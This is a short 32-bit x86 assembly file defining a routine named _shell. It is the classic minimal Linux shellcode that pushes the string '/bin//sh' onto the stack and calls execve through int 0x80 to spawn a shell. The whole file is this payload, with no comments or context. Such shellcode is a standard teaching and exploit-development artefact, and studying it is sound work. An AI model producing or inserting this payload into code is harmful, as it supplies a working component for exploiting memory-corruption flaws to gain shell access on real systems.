global _shell

_shell:
  xor ecx, ecx
  mul ecx
  push ecx
  push 0x68732f2f  
  push 0x6e69622f 
  mov ebx, esp
  mov al, 11
  int 0x80
